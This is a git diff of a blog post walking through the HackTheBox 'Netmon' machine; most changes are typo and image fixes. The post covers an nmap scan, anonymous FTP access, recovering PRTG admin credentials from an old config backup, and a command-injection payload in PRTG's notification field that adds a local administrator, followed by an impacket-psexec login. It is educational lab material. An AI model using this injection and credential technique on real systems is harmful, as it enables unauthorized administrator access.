@@ -3,15 +3,15 @@ author = "Jake Rice"
 title = "Who's That Netmon?!?!"
 date = "2022-08-29"
 description = ""
-draft = true
+draft = false
 tags = [
     "HTB",
     "CTF_Walkthrough",
 ]
 
-featureImage = "https://raw.githubusercontent.com/JRHacka/Blog-Site/main/jrhacka/static/images/Netmon.png" #Can't get image to work
-thumbnail = "https://raw.githubusercontent.com/JRHacka/Blog-Site/main/jrhacka/static/images/CoCanDaLogo.png"
-shareImage = "https://raw.githubusercontent.com/JRHacka/Blog-Site/main/jrhacka/static/images/CoCanDaLogo.png"
+featureImage = "https://raw.githubusercontent.com/JRHacka/Blog-Site/main/jrhacka/static/images/Netmon_logo.png" #Can't get image to work
+thumbnail = "https://raw.githubusercontent.com/JRHacka/Blog-Site/main/jrhacka/static/images/Netmon_logo.png"
+shareImage = "https://raw.githubusercontent.com/JRHacka/Blog-Site/main/jrhacka/static/images/Netmon_logo.png"
 
 +++
 Yes that title was a Pokemon reference, and if you didn't understand it I feel sorry for you. This is my walkthrough of the HTB Netmon box. Enjoy, and find my walkthough below!
@@ -20,7 +20,7 @@ Yes that title was a Pokemon reference, and if you didn't understand it I feel s
 ---
 ## Startup
 
-This is an entry level beginner friendly box, so the walkthrough is going to be the same. With that being said, the first step that other walkthroughs always skip over is spinning up the box and getting connected. While it is easy once you know how to do it if you don't know how you'll never be able to get started. Feel free to skip to the next section if you already know how to do this.
+This is an entry level beginner friendly box, so the start is going to be roughly the same. With that being said, the first step that other walkthroughs always skip over is spinning up the box and getting connected. While it is easy once you know how to do it if you don't know how you'll never be able to get started. Feel free to skip to the next section if you already know how to do this.
 
 HTB has 2 options when it comes to completing their boxes. You can spin up a machine via HTB, or connect your own using OpenVPN. I prefer to connect my because of the customizations and different tools I have on my Kali machine, but if you want here is where to find the HTB Attack Box.
 
@@ -33,7 +33,7 @@ Once you are sure is installed in the same place where you see the attack box yo
 openvpn insert/filepath/here
 ```
 
-After you have connected you may have to refresh the page in order for the connect box to turn green and show your HTB IP. After that the last step is to find the Jerry box and start it up.
+After you have connected, you may have to refresh the page in order for the connect box to turn green and show your HTB IP. After that the last step is to find the Jerry box and start it up.
 {{% notice note "Heads Up"%}}
 That IP in the green box will be the IP you use for yourself during interactions with this box. Do not use your actual IP.
 {{% /notice %}}
@@ -60,6 +60,8 @@ The first thing I always like to do is run NMap. Here is the NMap scan I ran and
 {{% /notice %}}
 ```bash
 nmap -sT -sV -Pn -p- -A -T3 tar.get.ip.add -oA /home/kali/HTB/Recording/Netmon/Nmap/nmap
+```
+```bash
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-29 19:42 EDT
 Nmap scan report for 10.10.10.152
 Host is up (0.038s latency).
@@ -134,12 +136,12 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 110.68 seconds
 ```
 
-So, we've got one item that really catches my eye in that NMap scan. Our old friend port 21 Anonymous FTP is open, and seems like an excellent place to start. 
+So, we've got one item that really catches my eye in that NMap scan. Our old friend port 21 Anonymous FTP is open and seems like an excellent place to start. 
 
 ---
 ## Port 21 - Anonymous FTP
 
-In the NMap scan the first thing that should catch your eye is that port 21 FTP is allowing Anonymous FTP. Anonymous FTP essentially means we can log in wihout having a username or password. We will connect using the user name anonymous with no password.
+In the NMap scan the first thing that should catch your eye is that port 21 FTP is allowing Anonymous FTP. Anonymous FTP essentially means we can log in without having a username or password. We will connect using the username anonymous with no password.
 ```bash
 ftp anonymous@tar.get.ip.add 
 ```
@@ -147,29 +149,28 @@ ftp anonymous@tar.get.ip.add
 The username being used is the one before the @ sign.
 {{% /notice %}}
 
-Once in we can begin doing our usual snooping, and unlike the Lame box here we can find a lot of useful stuff. In fact we can find our first flag in the users.txt file. Now we can't find the root flag, but we can find the items that are going to eventually lead us to the root flag. For now it is time we move out of our anonymous ftp and begin exploring the site itself. 
+Once in we can begin doing our usual snooping, and unlike the Lame box here we can find a lot of useful stuff. In fact, we can find our first flag in the users.txt file. Now we can't find the root flag, but we can find the items that are going to eventually lead us to the root flag. For now it is time we move out of our anonymous ftp and begin exploring the site itself. 
 
 ---
 ## Accessing the Site
 
-Before we can begin exploring the site we need to successfully login. First thing to always do is check default credintials. After doing some quick Googling you find the username and password. Unforutanetly prtgadmin does not work, so on to plan B. There's some tools and ways we could bruteforce this perhaps, but this PRTGNetworkMonitor appears to be a pretty popular software. Being the creative hackers we are lets see if we can see the configuration files via the anonymous ftp. According to https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data we can find the configuration files stored as PRTG Configuration.dat and that seems like a good a place to start as any.
+Before we can begin exploring the site, we need to successfully login. First thing to always do is check default credentials. After doing some quick Googling you find the username and password. Unfortunately prtgadmin does not work, so on to plan B. There's some tools and ways we could brute force this perhaps, but PRTGNetworkMonitor appears to be a pretty popular software. Being the creative hackers we are let’s see if we can see the configuration files via anonymous ftp. According to https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data we can find the configuration files stored as PRTG Configuration.dat and that seems like a good a place to start as any.
 
-Jumping back into anonymous ftp we are gonna head to the directory specified from that site. The directroy these files are stored in is Program Data, and at first it doesn't appear because it is hidden. Running the show directory command with a -a will now reveal program data. Navigating through there the config.old/.old.bak/.dat should catch your attention. When you open that up you see in the .old.bak file an admin username and password. 
+Jumping back into anonymous ftp we are going to head to the directory specified from that site. The directory these files are stored in is Program Data, and at first it doesn't appear because it is hidden. Running the show directory command with an -a will now reveal program data. Navigating through there the config.old/.old.bak/.dat should catch your attention. When you open that up you see in the .old.bak file an admin username and password. 
 
-
-BUTTTTT it still didn't work. After banging my head on the wall I realized it was a .old document, and it had a year in it. I changed the year to 2019 and was in. Cash money it's time to explore this site.
+BUTTTTT it still didn't work. After banging my head on the wall, I realized it was a .old document, and it had a year in it. I changed the year to 2019 and was in. Cash money it's time to explore this site.
 
 ---
 ## Exploring the Site
 
-This website has a whole lot going on. More then I care to just snoop into, so let's see if there are any known exploits. Looking up this version of the PRTG Network Monitor I started to get a lot of great information. We get some results about a Metasploit exploit, and also some articles about using the notifications to send malicious commands. For the sake of getting better everyday let's see if we can figure out these notifications and execute something from there. 
+This website has a whole lot going on. More than I care to just snoop into, so let's see if there are any known exploits. Looking up this version of the PRTG Network Monitor I started to get a lot of great information. We get some results about a Metasploit exploit, and some articles about using the notifications to send malicious commands. For the sake of getting better everyday let's see if we can figure out these notifications and do some command injection. 
 
 ---
 ## Exploiting the Vulnerability (Command Injection)
 
-Another incredible site https://tryhackme.com defines command injection as "the abuse of an application's behaviour to execute commands on the operating system, using the same privileges that the application on a device is running with." The notification portion of this site allows you to do some pretty interesting things, and that is going to be our home as we finish gaining administrator access to this box. 
+Another incredible site https://tryhackme.com defines command injection as "the abuse of an application's behavior to execute commands on the operating system, using the same privileges that the application on a device is running with." The notification portion of this site allows you to do some interesting things, and that is going to be our home as we finish gaining administrator access to this box. 
 
-In the bar up top select Settings, Account settings, Notifications, and then plus sign to create a new notification. Creating the notification we'll just skip most of the stuff at the top and jump straight to the bottom. There we find an option to execute program, and when you turn it on you can type a powershell command. We are going to create an admin user via this command to login using impacket-exec.
+In the bar up top select Settings, Account settings, Notifications, and then the plus sign to create a new notification. When creating the notification, we'll just skip most of the stuff at the top and jump straight to the bottom. There we find an option to execute program, and when you turn it on you can type a PowerShell command. We are going to create an admin user via this command to login using impacket-psexec.
 ```bash
 abc123.txt | net user jrhacka passwd123! /add ; net localgroup administrators jrhacka /add
 ```
@@ -188,11 +189,13 @@ net localgroup administrators jrhacka /add = adding jrhacka to the administrator
 ---
 ## Using Impacket PsExec
 
-First off what is PsExec? According to https://www.lifewire.com/psexec-4587631 "PsExec is a portable tool from Microsoft that lets you run processes remotely using any user's credentials. It’s a bit like a remote access program but instead of controlling the computer with a mouse, commands are sent via Command Prompt." That's explained it very well, and we are going to use the kali tool impacket-psexec in order to connect to this machine with the credintials we just created. Here is the syntax when connecting with this tool.
+First off what is PsExec? According to https://www.lifewire.com/psexec-4587631 "PsExec is a portable tool from Microsoft that lets you run processes remotely using any user's credentials. It’s a bit like a remote access program but instead of controlling the computer with a mouse, commands are sent via Command Prompt." That sums it up better then I ever could, and we are going to use the kali tool impacket-psexec in order to connect to this machine with the credentials we just created. Here is the syntax when connecting with this tool.
 ```bash
-impacket-psexec jrhacka:'passwd123!'@10.10.10.152
+impacket-psexec jrhacka:'passwd123!'@tar.get.ip.add
 ```
-After you've connected it's just a matter of snooping around and navigating back to that administrator directory we couldn't get to earlier. In there we find the admin flag and that's all she wrote! I hope you all learned something, enjoyed my writeup, and keep on getting better every day! 
+After you've connected it's just a matter of snooping around and navigating back to that administrator directory we couldn't get to earlier. In there we find the admin flag and that's all she wrote! I hope you all learned something, enjoyed my writeup, and continue better every day! 
 
 ---
+{{< youtube wJiKa3HDRA0 >}}
 
+<br>
